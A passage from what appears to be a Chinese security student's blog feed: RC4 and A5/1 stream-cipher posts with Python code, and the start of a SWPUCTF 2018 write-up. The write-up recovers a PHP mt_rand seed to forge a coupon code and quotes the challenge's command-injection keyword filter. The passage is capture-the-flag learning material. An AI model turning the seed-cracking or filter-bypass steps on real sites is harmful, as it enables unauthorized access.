mode == <span class="string">'2'</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            c_mode = input(<span class="string">"输入你的解密模式:Base64 or ordinary\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> c_mode == <span class="string">'Base64'</span>:</span><br><span class="line">                plain = base64.b64decode(plain)</span><br><span class="line">                plain = bytes.decode(plain)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> c_mode == <span class="string">'ordinary'</span>:</span><br><span class="line">                plain = plain</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Something Wrong,请重新新输入"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j =<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">        j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s)^k))</span><br><span class="line"></span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line">    <span class="keyword">if</span>  mode == <span class="string">'1'</span>:</span><br><span class="line">        <span class="comment"># 化成可视字符需要编码</span></span><br><span class="line">        print(<span class="string">"加密后的输出(没经过任何编码):"</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line">        <span class="comment"># base64的目的也是为了变成可见字符</span></span><br><span class="line">        print(<span class="string">"base64后的编码:"</span>)</span><br><span class="line">        print(str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)),<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        print(<span class="string">"解密后的密文："</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mode</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"请选择加密或者解密"</span>)</span><br><span class="line">    print(<span class="string">"1. Encrypt"</span>)</span><br><span class="line">    print(<span class="string">"2. Decode"</span>)</span><br><span class="line">    mode = input()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'1'</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message,box,mode)</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message, box, mode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"输入有误！"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        get_mode()</span><br></pre></td></tr></table></figure><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><ol><li>由于RC4算法加密是采用的xor，所以，一旦子密钥序列出现了重复，密文就有可能被破解。所以必须对加密密钥进行测试，判断其是否为弱密钥。</li><li>当然，现在RC4已经不安全了，可以参考这篇<a href="https://arstechnica.com/information-technology/2015/07/once-theoretical-crypto-attack-against-https-now-verges-on-practicality/" target="_blank" rel="noopener">文章</a>，破解RC4现在是具有很高效率的。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>A5的原理及python实现</title>
    <link href="0verwatch.top/A5-python.html"/>
    <id>0verwatch.top/A5-python.html</id>
    <published>2018-12-22T11:38:53.000Z</published>
    <updated>2018-12-22T11:44:12.849Z</updated>
    
    <content type="html"><![CDATA[<p>最近要做密码学课程设计，每做一个密码就当复习一下，把算法原理啥的都过一遍<a id="more"></a>吧</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>这个是用于GSM系统的序列密码算法，A5的特点是效率高，适合硬件上高效实现。</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><ol><li>A5 / 1基于三个线性反馈移位寄存器LFSR的组合，三个寄存器的长度分别为 19 22 23位，然后产生一个114位的秘钥流。因此首先输入8个字节的秘钥去填充三个寄存器的总长也就是64位。</li><li>每次获取各寄存器的最后一位相互异或一下再与明文进行异或。从这一点还是可以看出关键点在于秘钥，异或了两遍原信息一致，所以加密解密都是一样的算法了。</li><li>然后根据寄存器的某一位决定是否需要对某个储存器进行移位，存在的数据多的决定</li></ol><p>引用维基百科的一个图，这个图很好的揭示了加密的流程</p><p><img src="https://s1.ax1x.com/2018/12/22/FyME6I.png" alt="FyME6I.png"></p><p>总结要注意的加密的几个点：</p><h4 id="产生秘钥流"><a href="#产生秘钥流" class="headerlink" title="产生秘钥流"></a>产生秘钥流</h4><ol><li>根据8位秘钥产生的64位二进制填充寄存器</li><li>输出秘钥流，每一位都遵循<code>Z1[18]^Z2[21]^Z3[22]</code>这样的流程，我们需要注意的是这里讲序列密码的时候用<code>+</code>表示的都是异或</li><li>然后就经过114轮迭代，就可以产生114位秘钥啦</li></ol><h4 id="寄存器反馈"><a href="#寄存器反馈" class="headerlink" title="寄存器反馈"></a>寄存器反馈</h4><p>遵循“服从多数”的原则，从每个寄存器里面取出一个中间位(上图标黄的位置)进行运算，取出的3个中间位里面至少有两个1，则中间位为1的就进行移位，为0的就不移位，反之至少两个为0，则为0的进行一次位移，为1的就不移位了，保证了每次至少有了两个LFSR被驱动移位了。</p><h4 id="生成的补充值"><a href="#生成的补充值" class="headerlink" title="生成的补充值"></a>生成的补充值</h4><p>补充值由某些抽头位进行异或运算的结果决定，运算结果为1则补充为1，否则补充0,3个LFSR里的抽头位如下图，但是补充的前提是又寄存器反馈决定的</p><p><img src="https://s1.ax1x.com/2018/12/22/FyG33F.png" alt="FyG33F.png"></p><h4 id="python实现："><a href="#python实现：" class="headerlink" title="python实现："></a>python实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line">X = <span class="string">''</span></span><br><span class="line">Y = <span class="string">''</span></span><br><span class="line">Z = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(str_mess)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_mess:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        res += tmp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(bin_mess)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    tmp = re.findall(<span class="string">r'.&#123;8&#125;'</span>,bin_mess)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        res += chr(int(i,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSRinit</span><span class="params">()</span>:</span> <span class="comment">#用64bit密钥初始3个移位寄存器,分别是19,22,23位</span></span><br><span class="line">    <span class="keyword">global</span> X</span><br><span class="line">    <span class="keyword">global</span> Y</span><br><span class="line">    <span class="keyword">global</span> Z</span><br><span class="line">    key = input(<span class="string">"请输入8位秘钥\n"</span>)</span><br><span class="line">    <span class="keyword">while</span> len(key) != <span class="number">8</span>:   <span class="comment">#限定只能是8位，然后生成64位的二进制流</span></span><br><span class="line">        key = input(<span class="string">"请输入8位秘钥\n"</span>)</span><br><span class="line">    key_bin_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        key_bin_str += tmp</span><br><span class="line">    X = key_bin_str[<span class="number">0</span>:<span class="number">19</span>]</span><br><span class="line">    Y = key_bin_str[<span class="number">19</span>:<span class="number">41</span>]</span><br><span class="line">    Z = key_bin_str[<span class="number">41</span>:]</span><br><span class="line">    <span class="comment"># print("X"+X)</span></span><br><span class="line">    <span class="comment"># print("Y"+Y)</span></span><br><span class="line">    <span class="comment"># print("Z"+Z)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(bin_str,bin_key)</span>:</span> <span class="comment">#输入的字符串的二进制流</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_str)):</span><br><span class="line">        <span class="keyword">if</span> bin_str[i] == bin_key[i]:</span><br><span class="line">            res += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_key</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> X</span><br><span class="line">    <span class="keyword">global</span> Y</span><br><span class="line">    <span class="keyword">global</span> Z</span><br><span class="line">    LFSRinit()</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">114</span>):   <span class="comment"># A5 / 1用于为每个突发产生114比特的密钥流序列</span></span><br><span class="line">        <span class="comment"># a = X[-1]</span></span><br><span class="line">        <span class="comment"># b = Y[-1]</span></span><br><span class="line">        <span class="comment"># c = Z[-1]</span></span><br><span class="line">        g  = int(X[<span class="number">-1</span>]) ^ int(Y[<span class="number">-1</span>]) ^ int(Z[<span class="number">-1</span>])</span><br><span class="line">        res += str(g)  <span class="comment">#用最后一位异或产生秘钥流</span></span><br><span class="line">        x =  str(int(X[<span class="number">13</span>]) ^  int(X[<span class="number">16</span>]) ^ int(X[<span class="number">17</span>]) ^ int(X[<span class="number">18</span>]) ^ <span class="number">1</span>)               <span class="comment">#候选位的值</span></span><br><span class="line">        y =  str(int(Y[<span class="number">20</span>]) ^ int(Y[<span class="number">21</span>]) ^ <span class="number">1</span>)</span><br><span class="line">        z = str(int(Z[<span class="number">7</span>]) ^ int(Z[<span class="number">20</span>]) ^ int(Z[<span class="number">21</span>]) ^ int(Z[<span class="number">22</span>]) ^ <span class="number">1</span>)</span><br><span class="line">        <span class="comment">#选择的钟控位</span></span><br><span class="line">        c_x = int(X[<span class="number">8</span>])</span><br><span class="line">        c_y = int(Y[<span class="number">10</span>])</span><br><span class="line">        c_z = int(Z[<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">if</span> (c_x + c_y + c_z) &gt;= <span class="number">2</span>:<span class="comment">#多数的占优</span></span><br><span class="line">            choice = <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            choice = <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">if</span> str(c_x) == choice:</span><br><span class="line">            X = x + X[:<span class="number">-1</span>] <span class="comment">#隐式位移，这里是不包含最后一位的</span></span><br><span class="line">        <span class="keyword">if</span> str(c_y) == choice:</span><br><span class="line">            Y = y + Y[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> str(c_z) == choice:</span><br><span class="line">            Z = z + Z[:<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print("X"+X)</span></span><br><span class="line">        <span class="comment"># print("Y"+Y)</span></span><br><span class="line">        <span class="comment"># print("Z"+Z)</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a5_encode</span><span class="params">(mess)</span>:</span></span><br><span class="line">    bin_mess = str2bin(mess)</span><br><span class="line">    bin_key = create_key()</span><br><span class="line">    bin_cipher = <span class="string">""</span></span><br><span class="line">    <span class="comment">#print(len(bin_mess))</span></span><br><span class="line">    <span class="keyword">if</span> len(bin_mess) % <span class="number">114</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_mess), <span class="number">114</span>):</span><br><span class="line">            bin_cipher += xor(bin_mess, bin_key)</span><br><span class="line">    <span class="keyword">elif</span> len(bin_mess) &gt; <span class="number">114</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">114</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">    print(<span class="string">"二进制密文"</span> + bin_cipher)</span><br><span class="line">    print(<span class="string">"十六进制密文"</span>+hex(int(bin_cipher,<span class="number">2</span>)))</span><br><span class="line">    str_cipher = bin2str(bin_cipher)</span><br><span class="line">    print(base64.b64encode(str_cipher.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a5_decode</span><span class="params">(bin_mess)</span>:</span></span><br><span class="line">    bin_key = create_key()</span><br><span class="line">    bin_cipher = <span class="string">""</span></span><br><span class="line">    <span class="comment"># print(len(bin_mess))</span></span><br><span class="line">    <span class="keyword">if</span> len(bin_mess) % <span class="number">114</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_mess), <span class="number">114</span>):</span><br><span class="line">            bin_cipher += xor(bin_mess, bin_key)</span><br><span class="line">    <span class="keyword">elif</span> len(bin_mess) &gt; <span class="number">114</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">114</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">    str_cipher = bin2str(bin_cipher)</span><br><span class="line">    print(<span class="string">"解密后的结果:"</span>+str_cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span><span class="params">()</span>:</span></span><br><span class="line">    choice = input(<span class="string">"1.加密\n2.解密\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">        message = input(<span class="string">"输入你的信息\n"</span>)</span><br><span class="line">        a5_encode(message)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">        bin_message = input(<span class="string">"输入你的信息\n"</span>)</span><br><span class="line">        a5_decode(bin_message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"请重新输入"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        get_info()</span><br></pre></td></tr></table></figure><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>其实这个算法的关键点还是落在了秘钥的长度，体现在其寄存器的长度上，太短了，所以现在已知明文攻击法对这个算法的攻击是先确定其中两个寄存器的初始值再计算出另外一个，所以要想改进就是采用更长的线性反馈寄存器了。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近要做密码学课程设计，每做一个密码就当复习一下，把算法原理啥的都过一遍
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>swpuctf赛后复现</title>
    <link href="0verwatch.top/swpuctf-2018.html"/>
    <id>0verwatch.top/swpuctf-2018.html</id>
    <published>2018-12-22T08:02:40.000Z</published>
    <updated>2018-12-22T12:40:07.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛Web真的很有质量，学到了很多东西<a id="more"></a>，值得纪录一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h3><p>上来本能先注册登录一波查看有什么功能，发现注册赠送的优惠码不起任何作用，需要的是24位的注册码(但是给我的只有15位)，而且存在一个exec.php，但是必须要使用过优惠码才可以打开，思路很明确应该是要到这个页面去，但得绕进去，查看是否有常规的信息提示，发现没有提示只好扫一波目录，发现有源码</p><p><img src="https://s1.ax1x.com/2018/12/21/FsZBGt.png" alt="FsZBGt.png"></p><p>查看一下源码发现了产生随机优惠码的的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>证明了为什么这里的优惠码只有15位了，因为他后台就已经限定了长度为15，然后通过现在已经存在的代码反推，根据这篇文章模仿一下，构造出一部分的随机数:<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = <span class="string">"ZQ7hMEpfLtonAzK"</span>;</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">          &#123;</span><br><span class="line">              $pos = strpos($str_rand,$str[$i]);</span><br><span class="line">              <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($str_rand)<span class="number">-1</span>).<span class="string">" "</span>; </span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>记得这里一定要以PHP 7.2跑，不然跑出来不一样的。。。。这里推出一部分，但是不影响</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51 51 0 61 45 45 0 61 3 3 0 61 11 11 0 61 21 21 0 61 29 29 0 61 13 13 0 61 22 22 0 61</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsuotJ.png" alt="FsuotJ.png"></p><p>很快就可以跑出来，然后再手动播种，并且更改长度为24，输出秘钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">323099333</span>);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $auth;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">youhuima();</span><br></pre></td></tr></table></figure><p>然后就是绕过命令执行的部分了，源代码也有给出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span 